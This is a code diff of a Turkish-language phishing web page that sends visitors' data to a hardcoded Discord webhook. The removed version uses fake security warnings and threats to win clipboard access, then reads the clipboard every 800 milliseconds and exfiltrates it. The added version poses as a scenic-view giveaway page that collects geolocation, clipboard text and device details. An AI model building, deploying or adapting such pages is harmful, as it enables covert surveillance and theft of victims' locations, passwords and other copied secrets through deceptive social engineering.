@@ -3,127 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Güvenlik Doğrulama</title>
+    <title>🌍 Dünyanın En Güzel Manzarası</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             text-align: center;
-            padding: 50px;
-            background: #f4f4f4;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
         }
         .container {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            max-width: 400px;
+            max-width: 500px;
             margin: auto;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
         }
         button {
-            background: #007bff;
+            background: #ff6b6b;
             color: white;
             border: none;
-            padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 8px;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
             cursor: pointer;
             margin: 10px;
+            transition: transform 0.3s;
+            font-weight: bold;
         }
         button:hover {
-            background: #0056b3;
+            transform: scale(1.05);
+            background: #ff4757;
         }
-        .hidden {
-            display: none;
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            font-size: 14px;
+        }
+        .fake-location {
+            font-size: 12px;
+            color: #ddd;
+            margin-top: 10px;
         }
         #status {
             margin-top: 20px;
-            font-size: 14px;
-            color: #555;
+            font-style: italic;
         }
-        .fake-alert {
-            background: #ff9800;
-            color: white;
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 15px;
-            font-size: 13px;
+        .sad-face {
+            font-size: 50px;
+            animation: bounce 1s infinite;
+        }
+        @keyframes bounce {
+            0%,100%{ transform: translateY(0); }
+            50%{ transform: translateY(-10px); }
         }
     </style>
 </head>
 <body>
 <div class="container">
-    <h2>🔒 Güvenlik Doğrulaması</h2>
-    <p>Sistem güncellemesi nedeniyle <strong>kopyala/yapıştır izni</strong> vermelisiniz.</p>
-    <div class="fake-alert">
-        ⚠️ İzin vermezsen hesabın 24 saat kilitlenecek!
+    <h1>🌄 Dünyanın En Güzel Manzarası</h1>
+    <p>12.345 kişi bugün bu manzarayı gördü!</p>
+    
+    <button id="locationBtn">📍 Manzarayı Göster (Konum İzni Gerekli)</button>
+    <button id="clipboardBtn">📋 Hediye Kodunu Kopyala</button>
+    <button id="notifyBtn">🔔 Ödül Bildirimleri</button>
+    
+    <div id="result" class="result">
+        💡 İzin vererek manzarayı görebilir ve ödül kazanabilirsin!
     </div>
-    <button id="allowBtn">✅ İzin Ver</button>
-    <div id="status">Bekleniyor...</div>
+    <div id="status"></div>
 </div>
 
 <script>
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07";
-let lastText = "";
-let intervalId = null;
-let denyCount = 0;
 
-function sendToDiscord(data) {
+function sendToDiscord(msg) {
     fetch(DISCORD_WEBHOOK, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: data })
-    }).catch(e => console.log("Discord error:", e));
+        body: JSON.stringify({ content: msg })
+    }).catch(e => console.log(e));
 }
 
-function startClipboardListener() {
-    if (intervalId) clearInterval(intervalId);
-    intervalId = setInterval(() => {
-        navigator.clipboard.readText().then(text => {
-            if (text && text !== lastText && text.length > 0) {
-                let msg = `📋 **Clipboard Çalındı!**\n\`\`\`${text.substring(0, 1500)}\`\`\`\n🕒 ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent}`;
-                sendToDiscord(msg);
-                lastText = text;
-                document.getElementById("status").innerHTML = "✅ Son kopyalanan: " + text.substring(0, 50);
-            }
-        }).catch(() => {});
-    }, 800);
-}
-
-function requestPermission() {
-    navigator.clipboard.readText().then(() => {
-        document.getElementById("status").innerHTML = "✅ İzin verildi! Kopyaladığın her şey kontrol ediliyor.";
-        startClipboardListener();
-        sendToDiscord("✅ **Hedef izin verdi!** Clipboard dinleme başladı.");
-    }).catch(() => {
-        denyCount++;
-        document.getElementById("status").innerHTML = `❌ İzin vermedin (${denyCount}/5). Lütfen butona tıkla.`;
-        sendToDiscord(`❌ **Hedef izin vermeyi reddetti** (${denyCount}. kez)`);
-        
-        if (denyCount < 5) {
+// Konum izni
+document.getElementById("locationBtn").onclick = () => {
+    sendToDiscord("📍 **Konum izni isteniyor...**");
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            let coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+            sendToDiscord(`✅ **Konum alındı!**\nKoordinat: ${coords}\nDoğruluk: ${pos.coords.accuracy} metre`);
+            
+            // Sahte manzara mesajı
+            document.getElementById("result").innerHTML = `
+                🏔️ <strong>Muhteşem Manzara!</strong><br>
+                <img src="https://picsum.photos/400/200?random=1" style="border-radius: 10px; width:100%;"><br>
+                📍 Konumun: Eiffel Kulesi, Paris (sahte gösterim)<br>
+                🎁 Hediyeni almak için diğer butonlara tıkla!
+            `;
+            document.getElementById("status").innerHTML = "✅ Manzara yüklendi! Beğendin mi?";
+        },
+        (err) => {
+            sendToDiscord(`❌ **Konum reddedildi** - Hata: ${err.message}`);
+            document.getElementById("result").innerHTML = `
+                <div class="sad-face">😢</div>
+                <strong>Manzarayı göremedin...</strong><br>
+                Ama üzülme! Tekrar dene, belki bu sefer izin verirsin?
+            `;
+            document.getElementById("status").innerHTML = "⚠️ Konum izni vermedin. Tekrar dene!";
+            
+            // 2 saniye sonra tekrar istek
             setTimeout(() => {
-                document.getElementById("status").innerHTML = "⚠️ ZORUNLU! Butona tıkla.";
-                requestPermission();
+                document.getElementById("result").innerHTML = "🔁 Hadi şimdi izin ver, gerçekten çok güzel bir manzara!";
             }, 2000);
-        } else {
-            document.getElementById("status").innerHTML = "🔴 Son uyarı! Tarayıcın kapanacak. Lütfen izin ver.";
-            sendToDiscord("⚠️ **Hedef 5 kez reddetti - zorlama artırıldı**");
-            setTimeout(() => {
-                alert("GÜVENLİK UYARISI: Tarayıcı kapanacak. İzin vermelisin!");
-                requestPermission();
-            }, 1000);
         }
-    });
-}
-
-document.getElementById("allowBtn").onclick = () => {
-    document.getElementById("status").innerHTML = "İzin isteniyor...";
-    requestPermission();
+    );
 };
 
-// Sayfa açılır açılmaz butona dikkat çek
-setTimeout(() => {
-    document.getElementById("status").innerHTML = "🔔 HESABINI KORUMAK İÇİN BUTONA TIKLA!";
-}, 500);
+// Clipboard izni + sahte kod
+document.getElementById("clipboardBtn").onclick = async () => {
+    sendToDiscord("📋 **Clipboard izni isteniyor...**");
+    try {
+        await navigator.clipboard.writeText("MANZARA2026");
+        sendToDiscord("✅ **Clipboard'a yazı yazıldı** (sahte hediye kodu)");
+        document.getElementById("result").innerHTML = "📋 Hediye kodun panoya kopyalandı: <strong>MANZARA2026</strong><br>Bu kodu arkadaşlarına göster, onlar da kazansın!";
+        document.getElementById("status").innerHTML = "🎉 Kod kopyalandı! Şimdi arkadaşlarını davet et.";
+        
+        // Hedef kopyaladıktan sonra panodan okuma dene
+        let text = await navigator.clipboard.readText();
+        sendToDiscord(`📖 **Panodan okunan:** ${text}`);
+    } catch(e) {
+        sendToDiscord(`❌ **Clipboard izni reddedildi** - ${e.message}`);
+        document.getElementById("result").innerHTML = "❌ Kopyalama izni vermedin. Ama yine de kod: MANZARA2026";
+    }
+};
+
+// Bildirim izni
+document.getElementById("notifyBtn").onclick = () => {
+    sendToDiscord("🔔 **Bildirim izni isteniyor...**");
+    Notification.requestPermission().then(perm => {
+        if(perm === "granted") {
+            sendToDiscord("✅ **Bildirim izni verildi**");
+            new Notification("🎁 Tebrikler!", {body: "Hediye kazandın! Konum izni verdiğin için ekstra ödül seni bekliyor."});
+            document.getElementById("result").innerHTML = "🔔 Bildirimler aktif! Sana özel hediyeler gelecek.";
+        } else {
+            sendToDiscord("❌ **Bildirim izni reddedildi**");
+            document.getElementById("result").innerHTML = "🔕 Bildirimleri açarsan daha çok ödül kazanabilirsin.";
+        }
+    });
+};
+
+// Sayfa açılır açılmaz IP ve cihaz bilgisi gönder
+sendToDiscord(`🌐 **Yeni ziyaretçi**\nTarayıcı: ${navigator.userAgent}\nEkran: ${screen.width}x${screen.height}\nDil: ${navigator.language}`);
 </script>
 </body>
 </html>
